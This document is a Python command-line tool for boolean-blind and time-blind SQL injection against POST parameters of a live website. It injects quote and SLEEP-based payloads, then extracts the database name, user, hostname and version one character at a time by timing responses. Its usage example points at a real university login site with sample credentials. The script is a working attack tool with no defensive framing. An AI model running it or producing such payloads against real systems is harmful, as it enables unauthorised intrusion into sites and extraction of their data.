import sys,re
import requests
import time
import sys
from urllib.parse import parse_qs,urlencode

info = True

from colorama import Fore, Style, init

banner = r"""
                .-"------"-.  
               /            \ 
              |SQL INJECTION | 
              |,  .-.  .-.  ,| 
              | )(__/  \__)( | 
              |/     /\     \| 
    (@_       (_     ^^     _) 
  _  ) \________\__|IIIII|__/__________________________ 
  _(_)@8@8{}<___|-|\IIIII/|-|________________________-_> 
     )_/        \          / 
    (@            -------- BOOLEAN BLIND SQL INJECTION

              [---]   by:> galv1n   [---]
    """

# Inisialisasi Colorama
init(autoreset=True)


db_to_dump = []

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9"
}



def parse_cookies(cookie_str):
    cookies = {}
    for item in cookie_str.split(";"):
        if "=" in item:
            k, v = item.strip().split("=", 1)
            cookies[k] = v
    return cookies


def request_check(url, cookies, post_data):
    print("Checking Connection")
    parsed = parse_qs(post_data)
    print(parsed)
    print("Found",len(parsed), "Parameter")
    length = 0
    temp_length = 0

    try:
        r = requests.post(
            url,
            data=post_data,
            cookies=cookies,
            headers=HEADERS,
            timeout=15
        )
        print("Status:", r.status_code)
        length = len(r.text)
        if r.status_code == 200:
            print("Injecting SQLi payload")
            print("[!]=======================[!]")
            print("\n")
            for i in parsed:
                #print("Injecting",i)
               
                parsed[i][0]+="'"  

                new_post_data = urlencode(parsed, doseq=True)

                r2 = requests.post(url,data=new_post_data,cookies=cookies,headers=HEADERS,timeout=15)
               # print(r2.status_code)
                #print(new_post_data)
                temp_length = len(r2.text)
                if r2.status_code == 500 and temp_length != length:
                    #print("[!] Website appearance changed detected [!]\n[!] Potential of SQL Injection [!]")
                    #print("Status:", r2.status_code)
                    #print("Parameter", i,"berpotensi memiliki sql injection")
                    #print("Payload -> ",new_post_data)
                    blind_sqli(url,cookies,post_data,i)

                
                else:
                    print(Fore.GREEN, "i", Fore.RED, "is seem not to be injectable")
                parsed[i][0] = parsed[i][0].replace("'","",1) #reset biar gk using old data coy
                temp_length = 0 #reset biar gk using old data coy

 
    except Exception as e:
         print("Request error:", e)


def blind_sqli(url, cookies, post_data, parameter_name):
    #print("Testing Blind SQL Injection payload")
    payload = [
        "' AND'1'='1"
    ]
    #24060124140162' AND'1'='1
    
    length = 0
    temp_length = 0
    status = 200
    status_temp = 200
    r = requests.post(
        url,
        data=post_data,
        cookies=cookies,
        headers=HEADERS,
        timeout=15
    )
    length = len(r.text)
    parsed = parse_qs(post_data)

    for i in payload:
        #(i)
        #print("Testing Boolean Blind SQL Injection")
        parsed[parameter_name][0] = parsed[parameter_name][0] + i

        new_post_data = urlencode(parsed, doseq=True)

        #print(parsed)
        r2 = requests.post(url,data=new_post_data,cookies=cookies,headers=HEADERS,timeout=15)
        temp_length = len(r2.text)
        status = r2.status_code
        if temp_length == length and status_temp == status:
            print(Fore.GREEN+ "[+] " + Fore.WHITE +  "Target is" + Fore.RED + " vulnerable " + Fore.WHITE + "to SQL Injection " + Fore.GREEN + "Boolean Blind")

            print("Payload ->",new_post_data, parsed[parameter_name][0])
            payload_time_blind = "' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a) AND '1'='1"
            parsed2 = parse_qs(post_data)
            parsed2[parameter_name][0] = parsed2[parameter_name][0] + payload_time_blind
            new_postdata_timeblind = urlencode(parsed2, doseq=True)
            #print(parsed2[parameter_name][0])
            waktu_mulai = time.time()
            r3 = requests.post(
                url,
                data=new_postdata_timeblind,
                cookies=cookies,
                headers=HEADERS,
            )
            brp_lama = time.time()-waktu_mulai 
            print(brp_lama)
            if (brp_lama >= 5):
                print(Fore.GREEN+ "[+] " + Fore.WHITE +  "Target is" + Fore.RED + " vulnerable " + Fore.WHITE + "to SQL Injection " + Fore.GREEN + "Time Blind")
                print("Payload -> ", new_postdata_timeblind)
                if info:
                    print("dump")
                    get_info(url,cookies,post_data,parameter_name)

        parsed[parameter_name][0] = parsed[parameter_name][0].replace(i,"",1) #reset biar gk using old data coy
        temp_length = 0
        status_temp = 200


def get_info(url, cookies, post_data, vuln_parameter):
    targets = ["DATABASE()", "USER()", "@@hostname", "VERSION()"]

    CHAR_LIST = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.-@"


    for target in targets:
        print(f"\n[*] Bruteforcing: {target}")
        hasil_tebakan = ""
        posisi = 1
        
        while True:
            found_at_this_position = False
            
            for char in CHAR_LIST:
                parse = parse_qs(post_data)

                payload = f"'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP((SUBSTR({target},{posisi},1)=BINARY'{char}')*7)))a)/**/AND/**/'1'='1"
                
                parse[vuln_parameter][0] = parse[vuln_parameter][0] + payload
                postdata_kirim = urlencode(parse, doseq=True)

                start = time.time()
                try:
                    requests.post(url, data=postdata_kirim, cookies=cookies, headers=HEADERS, timeout=15)
                except:
                    pass
                end = time.time()

                if end - start >= 4.5:
                    hasil_tebakan += char
                    sys.stdout.write(f"{char}")
                    sys.stdout.flush()
                    found_at_this_position = True
                    posisi += 1
                    break 
            
            if not found_at_this_position:
                print(f"[!] Selesai Mencari {target}: {hasil_tebakan}")
                break
    

def main():
    print(Fore.CYAN + Style.BRIGHT + banner)
    
    
    print(Fore.GREEN + "[+] " + Fore.WHITE + "Starting exploit...", end="")
    sys.stdout.flush()
    
    # Animasi titik-titik
    for _ in range(3):
        time.sleep(0.5)
        print(".", end="")
        sys.stdout.flush()
    if len(sys.argv) < 4:
        print('\n[!] Invalid Syntax\n')
        print('Usage: python main.py https://<URL> "post data" "Cookies"')
        print('Example:')
        print('python main.py https://siap.undip.ac.id/ "username=galvin&password=galvin123" "sia_app_session=XXXyyyZZZ"')
        return
    
    url = sys.argv[1]
    post_data = sys.argv[2]
    cookies = parse_cookies(sys.argv[3])

    url_check = r"^https://[a-zA-Z0-9.-]+(/.*)?$"
    if not re.match(url_check, url):
        print("INVALID WEBSITE URL FOR", url)
        return
    
    if sys.argv[4] == "--info":
        print("shit nyala co")
        info= True
    print("\n[!]=======================[!]")
    print("URL:", url)
    print("Post Data:", post_data)
    print("Cookies:", cookies)

    request_check(url, cookies, post_data)


if __name__ == "__main__":
    main()
